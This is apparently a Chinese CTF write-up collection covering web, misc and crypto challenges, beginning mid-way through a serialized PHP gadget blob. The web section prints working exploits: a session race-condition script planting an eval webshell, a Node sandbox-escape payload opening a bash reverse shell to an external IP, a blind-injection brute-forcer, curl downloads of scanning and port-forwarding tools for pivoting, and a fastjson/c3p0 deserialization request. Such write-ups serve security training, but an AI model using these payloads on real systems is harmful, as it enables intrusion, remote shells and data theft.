iO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDA5MTZlM2VmMDAwMDAwMDA2NmFhYWNiYSI7fX1zOjMyOiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac2l6ZSI7aTotMTA7czozNDoiAEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAGJ1ZmZlciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czoxOiJqIjt9fX19czozODoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac2Vla2FibGUiO2I6MTt9fX19 flag{bc862289-85e9-48d8-9dd5-fc27162566ff} 安全检测考点：SSRF、session条件竞争 随意用户名都可以登陆，接着是SSRF的内容，通过访问http://127.0.0.1/admin/，获得include123.php文件 接着访问http://127.0.0.1/admin/include123.php，获取源码 根据过滤了内容， 可以知道是session条件竞争 import ioimport requestsimport threadingsess_id = 'Atao'def write(session): while True: f = io.BytesIO(b'a' * 1024 * 128) session.post(url='http://eci-2ze7cuv076c4risfr6z3.cloudeci1.ichunqiu.com', data={'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaasdasdasd&lt;?php phpinfo();file_put_contents(&quot;/tmp/1&quot;,&quot;&lt;?php eval(base64_decode(\\$_GET[1]));phpinfo();?&gt;&quot;);?&gt;'}, files={'file': ('atao.txt',f)}, cookies={'PHPSESSID': sess_id} )if __name__==&quot;__main__&quot;: event = threading.Event() session = requests.session() for i in range(1,80): threading.Thread(target=write,args=(session,)).start() 接着去访问http://127.0.0.1/admin/include123.php?u=/tmp/sess_Atao，访问到回显了phpinfo即可 这里写入/tmp/1一句话木马，接着访问http://127.0.0.1/admin/include123.php?u=/tmp/1&amp;1=c3lzdGVtKCIvZ2V0ZmxhZy5zaCIpOw==即可获得flag crawler_z考点：zombie的Nday漏洞、变量覆盖 从图一可知，personalBucket要和bucket的变量相同，图二中，personalBucket又会赋给user.bucket。所以这里我们可以发三次请求，第一次：正常请求主要是为了获得token值；第二次：上传exp的IP地址为了修改personalBucket内容；第三次：通过/user/verify？token=覆盖user.bucket 这里还有一个需要绕过的地方，在IP的结尾要跟上oss-cn-beijing.ichunqiu.com，如http://IP/index.html?aaa=oss-cn-beijing.ichunqiu.com即可。 &lt;script&gt;c='constructor';this[c][c](&quot;c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/47.98.147.229/7777 0&gt;&amp;1'],);console.log(ls.output.toString());&quot;)()&lt;/script&gt; 把上面的代码放在vps的index.html，zombie Nday漏洞参考链接：https://ha.cker.in/index.php/Article/13563 最后通过/user/bucket路由反弹shell，执行/readflag命令 PackageManager2021考点：SQL注入 通过审计源码，发现此处存在SQL注入的漏洞，可以通过构造00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username==&quot;admin&quot;&amp;&amp;this.password[i]==&quot;j&quot;)||this.username==&quot;123的Payload进行注入，获得admin用户的密码 上图可知，存在Bool盲注，这里最后的this.username为我们一开始注册的账户 import requests# b!@#$d5dh47jyfz#098crw*wflag = &quot;&quot;for i in range(0,50): for j in range(32,127): burp0_url = &quot;http://47.104.108.80:8888/auth&quot; burp0_cookies = {&quot;session&quot;: &quot;s%3Adq6vnQaD6PED4EhGg1tTvmpLa1FpJrUO.ATo3wP4XqidqLO0TbwAchNH41OxUxFFjF7KFNDKzVDs&quot;} burp0_headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://47.104.108.80:8888&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://47.104.108.80:8888/auth&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;} burp0_data = {&quot;_csrf&quot;: &quot;otezaj5Q-ZVimOBu-Aiw82rOf_hKkqlkbrvE&quot;, &quot;token&quot;: &quot;00f355689f5b7cb21e2a34346d9c55cd\\&quot;||(this.username==\\&quot;admin\\&quot;&amp;&amp;this.password[{}]==\\&quot;{}\\&quot;)||this.username==\\&quot;123&quot;.format(i,chr(j))} res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) print str(i)+&quot;:&quot;+chr(j) if &quot;No matching results&quot; in res.text: flag += chr(j) print flag break if j == 126: exit(0) 从上图可知admin的password，登陆了admin用户就可以获得flag了，flag为flag{407bb420-7845-4722-a322-f3f11b5bf09f} 层层穿透考点：Apache Flink 任意 Jar 包上传导致远程代码执行漏洞+fastjson反序列化 首先是：Apache Flink 任意 Jar 包上传导致远程代码执行漏洞 有现成的脚本：https://github.com/LandGrey/flink-unauth-rce 但是一直无法连接shell，可能是连接的人太多了，于是就改了一下脚本，直接在vps一直监听着，然后脚本一直跑着，等着环境重启，终于连接上了，然后并没有找到flag，再加上题目说了内网地址，所以怀疑还有内网环境，于是下载fscan（ https://github.com/shadow1ng/fscan ）扫描了一波，发现存在内网环境 进入tmp目录，使用curl下载fscan，我放到我自己的vps上 curl http://81.70.105.149/fscan_amd64 &gt;&gt; fscan_amd64 然后赋予权限 chmod 777 fscan_amd64 然后进行扫描 ./fscan_amd64 -h 10.10.1.1/24 扫描结果 发现内网 10.10.1.11 存在Shiro SprintBoot 于是就想着转发出来比较方便，继续下载了portmap( http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip ），我也是现将文件放至自己的vps然后使用curl下载 curl http://81.70.105.149/portmap &gt;&gt; portmap 然后也是赋予权限 chmod 777 portmap 然后在vps上运行，就是将5567端口的数据转发至8005端口 ./portmap -m 2 -p1 5567 -p2 8005 然后再在靶机上运行，将内网环境转发出来 ./portmap -m 3 -h1 81.70.105.149 -p1 5567 -h2 10.10.1.11 -p2 8080 运行结果 vps 靶机 然后就可以在公网访问了 题目提供了源码，下载下来，使用jd-gui反编译查看一下 账号密码为 admin / 123456 还发现了fastjson，但是有waf，需要绕过 然后再lib里发现了 hibernate-c3p0-5.3.14.Final.jar 在githun上面找到了绕过方式，c3p0反序列化（https://github.com/depycode/fastjson-c3p0） readme里面有说明 要想反序列化需要想登陆获取cookie，所以先登录 获取到cookie后bp抓包，修改数据包，直接将利用链复制粘贴，然后直接粘贴的话就会回显太短 因为对传入的长度进行了判断 所以直接就再填充2w的数据即可，最后的payload如下： POST /admin/test HTTP/1.1Host: 81.70.105.149:8005Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflatecmd: cat /flagAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/jsonContent-Length: 28963Cookie: d0c13ba04d29a2c666096db3206682c8=6f2998af-b14a-4ebc-9002-eea46873c544.KgKniEGW1GMEX6nqT4eQLtFMsXQ; request_token=8c7wo37zB5OkLDIpgnqfuht93rbWqTEjsLvir0wS0soYk8XE; pro_end=-1; ltd_end=-1; serverType=apache; order=id%20desc; memSize=1838; bt_user_info=%7B%22status%22%3Atrue%2C%22msg%22%3A%22%u83B7%u53D6%u6210%u529F%21%22%2C%22data%22%3A%7B%22username%22%3A%22158****9824%22%7D%7D; rank=list; Path=/www/wwwroot/myweb; file_recycle_status=true; JSESSIONID=4A2824342782C0A7393AF8ACF226F26B{&quot;e&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMapquot;}, &quot;b&quot;: { &quot;a&quot;: &quot;&quot; }} 成功获取flag Secrets_Of_Admin考点：SSRF 观察数据库可发现flag文件在superuser账号中，而此账号被禁用了，admin的密码在附件中可得到，登录后利用ssrf将superuser账号的flag文件添加到admin账号下，对content的限制可以利用数组进行bypass content[]=&lt;script&gt;location.href=&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=../files/flag&amp;checksum=be5a14a8e504a66979f6938338b0662c&quot;;&lt;/script&gt; 再读取即可 /api/files/be5a14a8e504a66979f6938338b0662c MISC层层取证层层套娃取证(确信)给了一个内存和一个虚拟磁盘的取证，先看磁盘，取证大师打开提示存在bitlocker加密用Passware Kit Forensic 2021 v1 (64-bit)能直接梭出来bitlocker的秘钥方法是把001解压出来，然后把2.ntfs放进去，再选择有内存镜像，导入这道题的内存镜像，然后等待…… 当然之后也发现内存中也可以找到，但是已经不重要得到549714-116633-006446-278597-176000-708532-618101-131406解开发现E盘存在一个流量包在udp里面找到一个rar，里面包含了一个flag.docx 然后导出，说压缩包密码是开机密码，然后去看俺的另一篇博客 这里提取的是92EFA7F9F2740956D51157F46521F941 密码xiaoming_handsome，cmd5解一下就行了(不会有人没开会员吧)解压之后发现docx还有密码实在找不到了的时候，挂载一下，发现hint 然后去仿真。。。。。。嗯仿真不出来照着https://www.freesion.com/article/51701409948/#DDE01_8 都不行然后就去导出内存，还是看👴的博客 找到然后密码 可以自己去操作放大看，偏移294435180，宽510结合用户名，得到xiaoming1314，解压成功得到flag flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2} 鸣雏恋改zip解压，在_rels下发现key和love，key是妥妥的零宽 解压之后是两张图，其实这里可以不用解压直接读CRC，可惜写的脚本有问题，还是解压了然后写个脚本，2进制的ASCII from PIL import Imagefrom tqdm import tqdmpath = 'C:\\\\Users\\\\mumuzi\\\\AppData\\\\Local\\\\Temp\\\\鸣雏恋_2dad763070b79f50c4635a906359909a\\\\鸣雏恋\\\\_rels\\\\love\\\\out\\\\'flag = ''for i in tqdm(range(129488)): img = Image.open(path+str(i)+'.png') s = img.getpixel((10,10)) if(str(s) == '1'): flag += '0' elif(str(s) == '3'): flag += '1' else: print('wrong!') exit()s = ''rflag = ''for i in flag: s+=i if len(s)==8: rflag += chr(int(s,2)) s=''print(rflag) 得到base64的png图，图片最下面就是flag flag{57dd74fb21bb1aee50f19421bf836f23} 考古最后的xor我是真的服气这一来怎么直接想得到太浪费时间了先imageinfo，发现是XP，然后pslist列出表，发现cmd正在运行，cmdscan看一下cmd 然后Filescan |grep “Oneclickcleanup.exe”，然后dumpfiles -Q 0x00000000017bcbc0 -D ./一共是得到一个dat和一个iso，dat直接拖IDA32发现是两个异或，第一个异或是存放地址，第二个异或是异或的数据 key是this_a_key，data就是数据，把data导出，写个脚本 s = 'this_a_key'flag = ''#flags = [0x37,0x52,0x35,0x37,0x30,0x02,0x2A,0x06,0x00,0x17,0x00,0x1B,0x49,0x12,0x31,0x05,0x7F,0x38,0x00,0x0D,0x00,0x01,0x07,0x14,0x2C,0x3D,0x1E,0x07,0x09,0x59,0x21,0x1B,0x0C,0x01,0x2C,0x3D,0x0B,0x0E,0x08,0x09,0x18,0x09,0x1D,0x16,0x2C]flags = [0xA4,0xA7,0x78,0x93,0xFE,0xD0,0x45,……中间略,0x79,0x74,0x68,0x69,0x73,0x5F,0x61]for i in range(len(flags)): flag += str(hex(flags[i] ^ ord(s[i%10])))[2:].zfill(2)print(flag)f = open('ffff.dot','wb')f.write(flag.encode()) 得到的ffff.dot用notepad++打开，将16进制转ascii为什么要保存为.dot，因为我在复现我知道是dot我乐意然后WPS打开发现提示版本过低，用office打开 然后就瞎试，比如看16进制，从200h-1800h和1800h到最后是一样的，两者相比较什么的，都试过了，没出继续看内存文件。最后。。。想着可打印ascii的词频和异或，结果异或出了 因为长度只有31位，爆破一下0-f，竟然不对，然后想着一共出现了两次，再去试试，还是不对。麻了因为是dot文档，又想着zip解压直接看源文件，然后再来异或 ???我可去你的吧居然还有一段最终得到flag flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309} 麻了 ChieftainsSecret首先给了一个文档和一张图片，文档就是题目描述，图片的话是一个古时候的电话搜了一下是怎么用的https://haokan.baidu.com/v?pd=wisenatural&amp;vid=15222023905414500076Jpg图片后面还有rar，foremost提取出来，发现是一堆TLE5501生成的数据，搜了一下他是一个角度的传感器，给了sinP,cosP,sinN,cosN本着不会做就乱试+搜公式的原则，发现想要计算出角度，就得找到tan，于是萌生了sinP/cosP,sinN/cosN,(sinP-sinN)/(cosP-cosN)的想法，想知道角度，就再加上一个ATAN函数，除出来是弧度，就再乘以一个57.3°顺便看了油管的视频，研究了一下四个值的变换https://www.youtube.com/watch?v=y68IdqZs4PM最后在看第三个想法的时候恍然大悟，搞出来也正好是11个峰 上图的意思就是ATAN((sinP-sinN)/(cosP-cosN))*57.3,然后因为ATAN的范围是-90°~90°，所以才会出现到90°的时候马上反转成负的，然后负的又接着变为正的，总之，第一个90°之后，后面的值要加180.第2个90°之后，后面加270，妈的简直找惨了。得到的数字大概为210 210 280 230 160 260 190 90 140 160 210然后去下载一个量角器(PicPickPortable)，发现2正好是90°，所以我直接就排除1了，然后一个个去量，下图举个例 对应7，然后其他的也依次如图得到77085962457 所以flag为flag{77085962457} Cryptomyrsafrom Crypto.Util.number import getPrime,bytes_to_long as b2lfrom math import gcdimport hashlibimport randomimport socketserver KEYSIZE = 512alpha = 2.0314159265358979WELCOME = 'Welcome to use my better RSA!!!!!!So, what do you want now?'menu = '1. encry \\n2. getflag\\n3. exit'String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz' def proof_of_work(): STR = ''.join([String[random.randint(0,len(String)-1)] for _ in range(16) ]) HASH = hashlib.sha256(STR.encode()).hexdigest() return STR[:4],STR[4:],HASH def key_gen(): while True: p,q = getPrime(KEYSIZE),getPrime(KEYSIZE) e = 0x10001 if gcd(e,(p-1)*(q-1)): break key = [getPrime(int(KEYSIZE*alpha)) for _ in range(128)] return (p,q,e),key # encryptodef encry(message,key,p,q,e): k1,k2 = key[random.randint(0,127)],key[random.randint(0,127)] x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = k1 + k2 c = pow(b2l(message),e,p*q) return x * c + y * c + z # get flagdef getflag(flag,key,p,q,e): return encry(flag,key,p,q,e) class server(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b'\\n' else: msg += '\\n' msg = msg.encode() self.request.sendall(msg) def handle(self): START,END,HASH = proof_of_work() self._send('SHA-256(?+{}) == {}'.format(END,HASH)) RCV = self._recv().decode() if RCV != START: return self._send(&quot;I'm a CryptoRookie,so my Crypto system take time, please wait a minute XD!&quot;) (p,q,e),key = key_gen() flag = open('flag','rb').read() self._send(WELCOME) self._send('This is my public key:\\nn = {}\\ne = {}'.format(str(p*q),str(e))) for _ in range(16): self._send(menu) COI = int(self._recv().decode()) if COI == 1 : self._send('Give me your message') message = self._recv() self._send('Your encry message:') self._send(str(encry(message,key,p,q,e))) elif COI == 2: self._send('This is your favourite:\\n') self._send(str(encry(flag,key,p,q,e))) elif COI == 3: self._send('Bye~') breakclass ForkedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass if __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 10001 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() 刚开始这题也太慢了吧，首先是个$pow$验证，然后产生密钥给了$n,e$,给了两个选项可以选择明文加密，或者直接得到$flag$的密文，跟进加密函数$C=m^e(x+y)+(z_1+z_2)$,而$x+y$可以化简得到$x+y={(p+q)}^3-{(p+q)}^2+(p+q)+4n$，可以认为$-{(p+q)}^2+(p+q)+4n$很小，比如说传$m=1$，得到${(p+q)}^3-{(p+q)}^2+(p+q)+4n+(z_1+z_2)=C$,此时直接对$C$开三次方可以得到$(p+q)$的一个大概值，本地测试的话相差也就几千上万，爆破即可，但是需要找个验证点，可以联立$p+q=l,p*q=n$解方程，如果方程存在解则对应$p+q$成立，也可以通过构造${(p-q)}^2={(p+q)}^2-4n$，当${(p+q)}^2-4n$可以完全开方时成立。得到$p+q$后，求${(p+q)}^3-{(p+q)}^2+(p+q)+4n$,显然这个远远大于$z_1+z_2$,所以$m^e=C//(x+y)$,再$rsa$解密，综上$exp$如下： from hashlib import *from gmpy2 import *from Crypto.Util.number import *from pwn import * p=remote('47.104.85.225',49877)context.log_level='debug' def pow(end,sha): String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz' for a in String: for b in String: for c in String: for d in String: s=(a+b+c+d).encode()+end if sha256(s).hexdigest()==sha: return a+b+c+d p.recvuntil('SHA-256(?+')end=p.recv(12)print(end)p.recvuntil('== ')sha=p.recvuntil('\\n')[:-1].decode()print(sha)xxx=pow(end,sha)p.sendline(xxx)p.recvuntil('n = ')n=int(p.recvuntil('\\n')[:-1])p.recvuntil('3. exit\\n')p.sendline('1')p.recvuntil('Give me your message')p.sendline('\\x01')p.recvuntil('Your encry message:\\n')c=int(p.recvuntil('\\n')[:-1])p_q=iroot(c,3)[0]print(p_q) while True: p_q=p_q-1 if iroot(p_q*p_q-4*n,2)[1]: M=p_q*p_q*p_q-p_q*p_q+p_q+4*n pp=(p_q+iroot(p_q*p_q-4*n,2)[0])//2 assert n%pp==0 q=n//pp breakp.recvuntil('3. exit\\n')p.sendline('2')p.recvuntil('This is your favourite:\\n')c=int(p.recvuntil('\\n\\n')[:-1])c=c//Mphi=(pp-1)*(q-1)e=65537d=invert(e,phi)m=powmod(c,d,n)print(long_to_bytes(m))#flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} guessfrom Crypto.Util.number import ( bytes_to_long, getPrime, long_to_bytes, getRandomNBitInteger,)import randomimport hashlibfrom math import gcdimport socketserver KEYSIZE = 512WELCOME = &quot;welcome to my funny challenge !!! Can you guess right 32 times in a row? &quot;String = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot; def exgcd(a, b): if b == 0: return 1, 0, a else: x, y, q = exgcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q def invert(a,p): x, y, q = exgcd(a,p) if q != 1: raise Exception(&quot;No solution.&quot;) else: return (x + p) % p def lcm(a,b): return a*b // gcd(a,b) def proof_of_work(): STR = &quot;&quot;.join([String[random.randint(0, len(String) - 1)] for _ in range(16)]) HASH = hashlib.sha256(STR.encode()).hexdigest() return STR[:4], STR[4:], HASH def keygen(): # part 1 p, q = getPrime(KEYSIZE), getPrime(KEYSIZE) n = p * q g = n + 1 LAMBDA = lcm(p - 1, q - 1) # part 2 _key = open(&quot;key&quot;, &quot;r&quot;).read() key = [] for i in _key.split(&quot;\\n&quot;): for j in i[1:-1].split(&quot; &quot;): if int(j) not in key: key.append(int(j)) assert len(key) == 80 assert key[0] == 119 and key[1] == 241 and key[2] == 718 and key[3] == 647 return n, g, LAMBDA, key def enc(n, g, m): while 1: r = random.randint(2, n - 1) if gcd(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c def dec(n, g, LAMBDA, c): L1 = (pow(c, LAMBDA, n ** 2) - 1) // n L2 = (pow(g, LAMBDA, n ** 2) - 1) // n m = (invert(L2, n) * L1) % n return m class server(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg, bytes): msg += b&quot;\\n&quot; else: msg += &quot;\\n&quot; msg = msg.encode() self.request.sendall(msg) def handle(self): print(&quot;Service start.&quot;) START, END, HASH = proof_of_work() self._send(&quot;SHA-256(?+{}) == {}&quot;.format(END, HASH)) RCV = self._recv().decode() if RCV != START: return flag = open(&quot;flag&quot;, &quot;rb&quot;).read() self._send(WELCOME) # step 1. KeyGen for _ in range(32): self._send(&quot;round &quot; + str(_+1)) n, g, LAM, KEY = keygen() self._send(&quot;Step 1 - KeyGen. This is my public key.&quot;) self._send(&quot;n = &quot; + str(n)) self._send(&quot;g = &quot; + str(g)) # step 2. Phase 1 self._send( &quot;Step 2 - Phase 1. Now, you can give me one ciphertexts,I will return the corresponding plaintext.&quot; ) self._send(&quot;Please give me one decimal ciphertext.&quot;) cipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) self._send(&quot;This is the corresponding plaintext.&quot;) self._send(plaintext) # step 3. challenge self._send( &quot;Step 3 - Challenge. Now, you must give me two decimal plaintexts(m0,m1), I will encry them and return a ciphertext randomly&quot; ) self._send(&quot;Give me m0.&quot;) plaintext1 = int(self._recv().decode()) self._send(&quot;Give me m1.&quot;) plaintext2 = int(self._recv().decode()) if ( plaintext1 &lt;= 2 or plaintext2 &lt;= 2 or len(bin(plaintext1)) != len(bin(plaintext2)) ): return R = 2 * random.randint(0, 39) I = random.randint(0, 1) cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R]) cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + 1]) self._send(&quot;This is a ciphertext.&quot;) self._send(str([cipher1, cipher2][I])) # step 4. Phase 2 self._send( &quot;Step 4 - Phase 2. Now, you can give me some ciphertexts,I will return the corresponding plaintext.But you can not give me the ciphertext that I give you in step 3.&quot; ) self._send(&quot;Please give me one decimal ciphertext &quot;) cipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) if int(plaintext) == plaintext1 * plaintext2 * KEY[R] or int(plaintext) == plaintext1 * plaintext2 * KEY[R+1]: return self._send(&quot;This is the corresponding plaintext.&quot;) self._send(plaintext) # step.5 Guess self._send( &quot;Step 5 - Guess. You must tell me which ciphertext was I give you in step 3, 0 or 1(m0 -&gt; c0 , m1 -&gt; c1)?&quot; ) Guess = int(self._recv().decode()) if Guess == I: self._send(&quot;Good! You are right&quot;) else: self._send(&quot;Sorry!&quot;) return self._send(flag) class ForkedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass if __name__ == &quot;__main__&quot;: HOST, PORT = &quot;0.0.0.0&quot;, 10001 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() from Crypto.Util.number import getRandomNBitIntegerwhile 1: A = [] key = random_matrix(ZZ, 20, 4, x = 100, y =1000) for i in range(20): for j in range(4): if key[i,j] not in A: A.append(key[i,j]) if len(A) == 80: breakhint = Matrix(key * vector([getRandomNBitInteger(1024) for _ in range(4)]) for _ in range(12))open('key','w').write(str(key))open('hint','w').write(str(hint)) 首先看求$key$的部分，$key$是一个$20*4$的小矩阵$A$，乘上一个随机产生的$4*12$的大矩阵$B$得到$hint$，这里矩阵大小指的是数字大小，$key$给了第一个行向量，$AB=H$,可以写成$B^TA^T=H^T$,$H^T$中每个行向量都是$A^T$中行向量的线性组合，也就是说$H^T$中每一个行向量都在$A^T$所所组成的格子中，只需要对$H^T$进行格基规约，就能找到$A^T$的行向量。使用$LLL,BKZ$算法，需要对其参数$delta$修改，求到四个行向量根据已知条件排列再矩阵倒置一下。求到$key$之后进入正题，首先也是个$pow$验证，可以发现加密算法是$paillier$， - $step1$生成密钥给出$n,g$ - $step2$,传入密文返回对应明文，但是没有密文可传也没必要，所以这步应该没啥用的。 - $step3$,传入两个明文$p_1,p_2$,产生随机下标$R$,$R$是偶数，分别加密$p_1p_2k_R$和$p_1p_2k_{R+1}$,再随机返回一个密文。 - $step4$，传入一个密文，但不能是$step3$得到的，然后返回明文。 - $step5$，推断$step3$返回的明文对应的是哪个明文。所以直接到$step3$,随便传两个明文，但需要比特数相同且不小于$2$得到密文，然后$step4$，这里需要用到$paillier$的一个性质$D(c_1*c_2)=m_1+m_2$,也有$D(c^k)=km$,所以只需要传密文的$n$次方，就可以得到明文的$n$倍，就可以得到$key$值，判断$key$值的下标是是偶数还是奇数就行。 from hashlib import *from gmpy2 import *from Crypto.Util.number import *from pwn import *p=remote('47.104.85.225',49877)context.log_level='debug'def pow(end,sha): String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz' for a in String: for b in String: for c in String: for d in String: s=(a+b+c+d).encode()+end if sha256(s).hexdigest()==sha: return a+b+c+d p.recvuntil('SHA-256(?+')end=p.recv(12)print(end)p.recvuntil('== ')sha=p.recvuntil('\\n')[:-1].decode()print(sha)xxx=pow(end,sha)p.sendline(xxx)p.recvuntil('n = ')n=int(p.recvuntil('\\n')[:-1])p.recvuntil('3. exit\\n')p.sendline('1')p.recvuntil('Give me your message')p.sendline('\\x01')p.recvuntil('Your encry message:\\n')c=int(p.recvuntil('\\n')[:-1])p_q=iroot(c,3)[0]print(p_q)while True: p_q=p_q-1 if iroot(p_q*p_q-4*n,2)[1]: M=p_q*p_q*p_q-p_q*p_q+p_q+4*n pp=(p_q+iroot(p_q*p_q-4*n,2)[0])//2 assert n%pp==0 q=n//pp breakp.recvuntil('3. exit\\n')p.sendline('2')p.recvuntil('This is your favourite:\\n')c=int(p.recvuntil('\\n\\n')[:-1])c=c//Mphi=(pp-1)*(q-1)e=65537d=invert(e,phi)m=powmod(c,d,n)print(long_to_bytes(m))#flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} random rsafrom Crypto.Util.number import *import gmpy2import libnumimport randomimport binasciiimport os flag=r'flag{}' p=getPrime(512)q=getPrime(512)e=0x10001n=p*qct=pow(flag,e,n)print(&quot;n=&quot;+ n)print(&quot;ct=&quot;+ ct) dp=r''seeds = []for i in range(0,len(dp)): seeds.append(random.randint(0,10000)) res = [] for i in range(0, len(dp)): random.seed(seeds[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) res.append(ord(dp[i]) ^ rands[i%4]) del rands[i%4] print(str(rands)) print(res) print(seeds) # n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391# ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 # [58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]# [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 